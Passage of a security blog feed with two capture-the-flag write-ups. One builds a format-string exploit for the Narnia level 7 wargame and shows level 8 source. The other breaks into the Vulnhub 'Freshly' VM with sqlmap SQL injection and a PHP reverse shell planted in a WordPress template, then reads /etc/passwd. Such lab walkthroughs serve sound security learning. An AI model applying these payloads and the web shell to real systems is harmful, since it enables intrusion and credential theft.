0xffffd640:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd650:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd660:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd670:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd680:     0x00000000      0x00000000      0x00000000      0x00000000
&lt;/pre&gt;
&lt;p&gt;The value of &lt;em&gt;2f&lt;/em&gt; at &lt;code&gt;0xffffd60c&lt;/code&gt; shows us that our overwrite was successful
and we wrote the value of &lt;em&gt;47&lt;/em&gt;. We need to write &lt;code&gt;0x8048706&lt;/code&gt; which is &lt;code&gt;134514438&lt;/code&gt; in decimal.
So let's add our &lt;code&gt;%d&lt;/code&gt; in and remember to adjust the number of &lt;code&gt;%x&lt;/code&gt;s too, so we can see
how much padding we need&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;(gdb) r $(python -c &amp;quot;print 'aaaa\x0c\xd6\xff\xff' + '%x'*5 + '%d%n'&amp;quot;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c &amp;quot;print 'aaaa\x0c\xd6\xff\xff' + '%x'*5 + '%d%n'&amp;quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:     0xffffd610      0x00000080      0xffffd8a2      0x08048238
0xffffd600:     0xffffd668      0xf7ffda94      0x00000000      0x00000031
0xffffd610:     0x61616161      0xffffd60c      0x38343038      0x66383332
0xffffd620:     0x64666666      0x66383636      0x64666637      0x30343961
0xffffd630:     0x38343038      0x31306536      0x37333336      0x37383137
0xffffd640:     0x00000033      0x00000000      0x00000000      0x00000000
0xffffd650:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd660:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd670:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd680:     0x00000000      0x00000000      0x00000000      0x00000000&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Ok, so &lt;code&gt;0x8048706 - 0x00000031 = 0x80486d6&lt;/code&gt; or &lt;em&gt;134514389&lt;/em&gt; in decimal.
Let's see if I'm right&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;(gdb) r $(python -c &amp;quot;print 'aaaa\x0c\xd6\xff\xff' + '%x'*5 + '%134514389d%n'&amp;quot;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c &amp;quot;print 'aaaa\x0c\xd6\xff\xff' + '%x'*5 + '%134514389d%n'&amp;quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:     0xffffd610      0x00000080      0xffffd899      0x08048238
0xffffd600:     0xffffd668      0xf7ffda94      0x00000000      0x080486fc
0xffffd610:     0x61616161      0xffffd60c      0x38343038      0x66383332
0xffffd620:     0x64666666      0x66383636      0x64666637      0x30343961
0xffffd630:     0x38343038      0x20306536      0x20202020      0x20202020
0xffffd640:     0x20202020      0x20202020      0x20202020      0x20202020
0xffffd650:     0x20202020      0x20202020      0x20202020      0x20202020
0xffffd660:     0x20202020      0x20202020      0x20202020      0x20202020
0xffffd670:     0x20202020      0x20202020      0x20202020      0x20202020
0xffffd680:     0x20202020      0x20202020      0x20202020      0x00202020&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Still a little off. Adjusting the value again&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;(gdb) r $(python -c &amp;quot;print 'aaaa\x0c\xd6\xff\xff' + '%x'*5 + '%134514399d%n'&amp;quot;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c &amp;quot;print 'aaaa\x0c\xd6\xff\xff' + '%x'*5 + '%134514399d%n'&amp;quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:     0xffffd610      0x00000080      0xffffd899      0x08048238
0xffffd600:     0xffffd668      0xf7ffda94      0x00000000      0x08048706
0xffffd610:     0x61616161      0xffffd60c      0x38343038      0x66383332
0xffffd620:     0x64666666      0x66383636      0x64666637      0x30343961
0xffffd630:     0x38343038      0x20306536      0x20202020      0x20202020
0xffffd640:     0x20202020      0x20202020      0x20202020      0x20202020
0xffffd650:     0x20202020      0x20202020      0x20202020      0x20202020
0xffffd660:     0x20202020      0x20202020      0x20202020      0x20202020
0xffffd670:     0x20202020      0x20202020      0x20202020      0x20202020
0xffffd680:     0x20202020      0x20202020      0x20202020      0x00202020
(gdb) c
Continuing.
Way to go!!!!$&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;And now we need to run it from the commandline to actually get a proper setuid shell&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="o"&gt;&lt;/span&gt;&lt;span class="gp"&gt;narnia7&amp;#64;melinda:/narnia$ .//narnia7 $&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;python -c &lt;span class="s2"&gt;&amp;quot;print 'aaaa\x0c\xd6\xff\xff' + '%x'*5 + '%134514399d%n'&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd61c)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
&lt;/span&gt;&lt;span class="o"&gt;&lt;/span&gt;&lt;span class="gp"&gt;narnia7&amp;#64;melinda:/narnia$ .//narnia7 $&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;python -c &lt;span class="s2"&gt;&amp;quot;print 'aaaa\x1c\xd6\xff\xff' + '%x'*5 + '%134514399d%n'&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd61c)
I guess you want to come to the hackedfunction...
Way to go!!!!$ whomai
/bin/sh: 1: whomai: not found
&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; whoami
&lt;span class="go"&gt;narnia8
&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat /etc/narnia_pass/narnia8
&lt;span class="go"&gt;[password]&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Notice that the address of &lt;code&gt;ptrf&lt;/code&gt; is not the same in the shell :)&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-08"&gt;
&lt;h2&gt;Level 08&lt;/h2&gt;
&lt;pre class="code c literal-block"&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
&lt;/span&gt;&lt;span class="c1"&gt;// gcc's variable reordering fucked things up
// to keep the level in its old style i am
// making &amp;quot;i&amp;quot; global unti i find a fix
// -morla
&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;blah&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;bok&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="c1"&gt;//int i=0;
&lt;/span&gt;
    &lt;span class="n"&gt;memset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bok&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="sc"&gt;'\0'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bok&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;blah&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="sc"&gt;'\0'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;bok&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;blah&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;bok&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argc&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%s argument&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;I'm struggling with this, and rather than delay the whole post because of the last
level, I decided to post anyway. I'll update this when I have this figured out.&lt;/p&gt;
&lt;p&gt;Sorry.&lt;/p&gt;
&lt;/div&gt;
</summary></entry><entry><title>Vulnhub's 'TopHatSec Freshly'</title><link href="http://unlogic.co.uk/2015/04/11/vulnhubs-tophatsec-freshly/" rel="alternate"></link><updated>2015-04-11T21:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-04-11:2015/04/11/vulnhubs-tophatsec-freshly/</id><summary type="html">&lt;p&gt;This is my first writeup of a &lt;a class="reference external" href="https://vulnhub.com"&gt;Vulnhub&lt;/a&gt; wargame: Freshly.&lt;/p&gt;
&lt;p&gt;The challenge is:&lt;/p&gt;
&lt;blockquote&gt;
The goal of this challenge is to break into the machine via
the web and find the secret hidden in a sensitive file.&lt;/blockquote&gt;
&lt;p&gt;Go grab the image and follow along.&lt;/p&gt;
&lt;p&gt;First I need to determine the image's IP address and what services it is running:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;root&amp;#64;kali:~#&lt;/span&gt; nmap -sn 192.168.56.0/24
&lt;span class="go"&gt;
Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-10 18:19 BST
Nmap scan report for 192.168.56.1
Host is up (0.00019s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100
Host is up (0.00088s latency).
MAC Address: 08:00:27:F7:1C:75 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.103
Host is up (0.00036s latency).
MAC Address: 08:00:27:F2:73:82 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.102
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.76 seconds
&lt;/span&gt;&lt;span class="gp"&gt;root&amp;#64;kali:~#&lt;/span&gt; nmap -p- 192.168.56.103
&lt;span class="go"&gt;
Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-10 18:19 BST
Nmap scan report for 192.168.56.103
Host is up (0.00026s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy
MAC Address: 08:00:27:F2:73:82 (Cadmus Computer Systems)

Nmap done: 1 IP address (1 host up) scanned in 6.46 sconds&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;So I can see the host is at &lt;code&gt;192.168.56.103&lt;/code&gt; and has ports &lt;em&gt;80, 443, and 8080&lt;/em&gt;
open. Browsing to the address presents an animated gif.&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/qgkgkgg.png" /&gt;
&lt;p&gt;My initial reaction is
to look at the source, but here I only see the &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tag and the image filename.
The image filename could be useful later, but right now I see no use for it.&lt;/p&gt;
&lt;p&gt;In that case let's see if the SSL port holds anything more interesting.&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/wvHo8ru.png" /&gt;
&lt;p&gt;Nice, looks like I'm getting somewhere. I follow this link to a wordpress site
which sells candy. Generally browsing the site I notice it's a Bitnami install
of a Wordpress site, running a few plugins.&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/SHEXup3.png" style="width: 600px;" /&gt;
&lt;p&gt;Before I start work on that, let me just see what's at port &lt;em&gt;8080&lt;/em&gt;. Ah, it's a
non &lt;em&gt;https&lt;/em&gt; version of the wordpress site. I'm going to use that instead
of the &lt;em&gt;https&lt;/em&gt; version to avoid any certificate issues and generally make life
a bit easier.&lt;/p&gt;
&lt;p&gt;Using &lt;code&gt;wpscan&lt;/code&gt; I can find out which of the installed plugins have vulnerabilities.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;root&amp;#64;kali:~#&lt;/span&gt; wpscan -u http://192.168.56.103:8080/wordpress --enumerate vp
&lt;span class="go"&gt;_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.6
          Sponsored by Sucuri - https://sucuri.net
   &amp;#64;_WPScan_, &amp;#64;ethicalhack3r, &amp;#64;erwan_lr, pvdl, &amp;#64;_FireFart_
_______________________________________________________________

[+] URL: http://192.168.56.103:8080/wordpress/
[+] Started: Fri Apr 10 18:42:00 2015

[!] The WordPress 'http://192.168.56.103:8080/wordpress/readme.html' file exists exposing a version number
[!] Full Path Disclosure (FPD) in: 'http://192.168.56.103:8080/wordpress/wp-includes/rss-functions.php'
[+] Interesting header: SERVER: Apache
[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
[+] XML-RPC Interface available under: http://192.168.56.103:8080/wordpress/xmlrpc.php

[+] WordPress version 4.1 identified from meta generator

[+] Enumerating installed plugins (only vulnerable ones) ...

   Time: 00:01:40 &amp;lt;============================================&amp;gt; (952 / 952) 100.00% Time: 00:01:40

[+] We found 4 plugins:

[+] Name: cart66-lite - v1.5.3
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/cart66-lite/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/cart66-lite/readme.txt

[!] Title: Cart66 Lite &amp;lt;= 1.5.3 - SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/7737
    Reference: https://research.g0blin.co.uk/g0blin-00022/
    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9442
[i] Fixed in: 1.5.4

[+] Name: google-analytics-for-wordpress - v5.3.1
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/google-analytics-for-wordpress/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/google-analytics-for-wordpress/readme.txt

[!] Title: Google Analytics by Yoast 5.3.2 - Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/7838
    Reference: http://packetstormsecurity.com/files/130716/
    Reference: http://osvdb.org/119334

[+] Name: proplayer - v4.7.9.1
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/proplayer/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/proplayer/readme.txt

[!] Title: ProPlayer 4.7.9.1 - SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/6912
    Reference: http://osvdb.org/93564
    Reference: http://www.exploit-db.com/exploits/25605/

[+] Name: wptouch - v3.6.6
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/wptouch/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/wptouch/readme.txt

[!] Title: WPtouch &amp;lt;= 3.6.6 - Unvalidated Open Redirect
    Reference: https://wpvulndb.com/vulnerabilities/7837
    Reference: https://wordpress.org/plugins/wptouch/changelog/
[i] Fixed in: 3.7

[+] Finished: Fri Apr 10 18:43:48 2015
[+] Memory used: 9.027 MB
[+] Elapsed time: 00:01:48&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;There's a few there, so I'll look at each on in turn to see how easy it is to
exploit, and what it might yield.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p class="first"&gt;Cart66 Lite &amp;lt;= 1.5.3 - SQL Injection&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;This requires the user to be logged in, and seeing as I don't have a login
I won't get very far with this.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Google Analytics by Yoast 5.3.2 - Cross-Site Scripting (XSS) ###&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;This requires admin access to the site, in order to configure the plugin.
Another dead end.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;ProPlayer 4.7.9.1 - SQL Injection&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Not much luck with this. Although it doesn't require a login, I wasn't
successful with getting anything out of it.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;WPtouch &amp;lt;= 3.6.6 - Unvalidated Open Redirect&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I doubt that an unvalidated redirect will be of much use here.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Ok, thinking cap back on.... I need a different angle of attack.&lt;/p&gt;
&lt;p&gt;Revisiting the main wordpress site there is something a bit unusual.&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/2ddRfdF.png" /&gt;
&lt;p&gt;Did I miss something? Did I get done by a Jedi mindtrick? Let's see. I'll
head back to the main site and try and find some other pages with &lt;em&gt;DirBuster&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;This is how I set it up&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/auVPaoO.png" style="width: 600px;" /&gt;
&lt;p&gt;Using this list I got lucky and received two interesting hits after short while&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/l647X5u.png" style="width: 600px;" /&gt;
&lt;p&gt;I've decided to hold back on on the &lt;code&gt;phpmyadmin&lt;/code&gt; and investigate the &lt;code&gt;login.php&lt;/code&gt;
first. This is what lies at the end of that URL&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/c8aSx4n.png" /&gt;
&lt;p&gt;I could just start attacking this with various SQLi strings, but the
beauty of attacking a virtual machine is that I can use tools without the fear
of breaking someone else's stuff. Roll out &lt;code&gt;sqlmap&lt;/code&gt; and let's see what we can find:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;root&amp;#64;kali:~#&lt;/span&gt; sqlmap  -u &lt;span class="s2"&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;
&amp;lt;snip&amp;gt;

POST parameter 'user' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y

&amp;lt;snip&amp;gt;

POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y

&amp;lt;snip&amp;gt;

[12:17:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL 5.0.11&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;I've removed some of the output for clarity, but I can see
that there's possibility of a blind SQL injection for both &lt;code&gt;user&lt;/code&gt; and
&lt;code&gt;password&lt;/code&gt; and that it's a MySQL databse. Great.
We can carry on using &lt;code&gt;sqlmap&lt;/code&gt; to try and discover
what tables there are and if we can find any useful information.&lt;/p&gt;
&lt;p&gt;First I'll get a list of databases on the system. This process takes a little while,
so when it asks &amp;quot;&lt;em&gt;do you want sqlmap to try to optimize value(s) for DBMS delay
responses (option '--time-sec')? [Y/n]&lt;/em&gt;&amp;quot; answer &lt;em&gt;YES&lt;/em&gt;. It will be done quicker.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;root&amp;#64;kali:~#&lt;/span&gt; sqlmap  -u &lt;span class="s2"&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt; --dbms&lt;span class="o"&gt;=&lt;/span&gt;mysql --dbs
&lt;span class="go"&gt;
&amp;lt;snip&amp;gt;

[12:20:19] [INFO] fetching database names
[12:20:19] [INFO] fetching number of databases
[12:20:19] [INFO] retrieved: 7
[12:20:21] [INFO] retrieved: information_schema
[12:21:36] [INFO] retrieved: login
[12:21:59] [INFO] retrieved: mysql
[12:22:20] [INFO] retrieved: performance_schema
[12:23:33] [INFO] retrieved: phpmyadmin
[12:24:18] [INFO] retrieved: users
[12:24:43] [INFO] retrieved: wordpress8080
available databases [7]:
[*] information_schema
[*] login
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] users
[*] wordpress8080

[12:25:44] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.56.103'

[*] shutting down at 12:25:44&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;It found seven databases, amongst which is an interesting one: &lt;code&gt;wordpress8080&lt;/code&gt;.
This seems to be the wordpress database, so I can start attacking that and see
if I can get the &lt;em&gt;admin&lt;/em&gt; account. The &lt;code&gt;login&lt;/code&gt; and &lt;code&gt;users&lt;/code&gt; databases also look
interesting, so let's take a look at those later. Additionally, if I can get
a login, especially an &lt;em&gt;admin&lt;/em&gt; one, I could try to exploit the plugins later on.
After all, it does say there are multiple ways into this VM.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;root&amp;#64;kali:~#&lt;/span&gt; sqlmap  -u &lt;span class="s2"&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt; --dbms&lt;span class="o"&gt;=&lt;/span&gt;mysql --tables -D wordpress8080
&lt;span class="go"&gt;
&amp;lt;snip&amp;gt;

Database: wordpress8080
[1 table]
+-------+
| users |
+-------+

&lt;/span&gt;&lt;span class="gp"&gt;root&amp;#64;kali:~#&lt;/span&gt; sqlmap  -u &lt;span class="s2"&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt; --dbms&lt;span class="o"&gt;=&lt;/span&gt;mysql --dump -T users -D wordpress8080
&lt;span class="go"&gt;
&amp;lt;snip&amp;gt;

Database: wordpress8080
Table: users
[1 entry]
+----------+---------------------+
| username | password            |
+----------+---------------------+
| admin    | SuperSecretPassword |
+----------+---------------------+&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;The admin password for the wordpress site, excellent. As for the other tables,
I didn't find anything useful in them, so I won't post the output here. In that case
I might aswell just login to the wordpress site now. Basically I have full control
of the wordpress site now, so what should I do? How does a PHP shell sound? Good?
Alright then... &lt;code&gt;cd /usr/share/webshells/php&lt;/code&gt; and I'm going to use the
&lt;code&gt;php-reverse-shell.php&lt;/code&gt; and replace the site's &lt;em&gt;404&lt;/em&gt; with that.&lt;/p&gt;
&lt;p&gt;To do that I need to edit the theme in the admin section, and just
paste in the contents. The I need to open a listening &lt;code&gt;netcat&lt;/code&gt; session and
browse to a non-existant page on the site.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;root&amp;#64;kali:/usr/share/webshells/php#&lt;/span&gt; nc -lvnp 1337
&lt;span class="go"&gt;listening on [any] 1337 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 43875
Linux Freshly 3.13.0-45-generic #74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 i686 i686 GNU/Linux
 19:36:34 up  5:45,  0 users,  load average: 0.08, 0.03, 0.05
USER     TTY      FROM             LOGIN&amp;#64;   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; /etc
&lt;span class="gp"&gt;$&lt;/span&gt; cat passwd
&lt;span class="go"&gt;root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
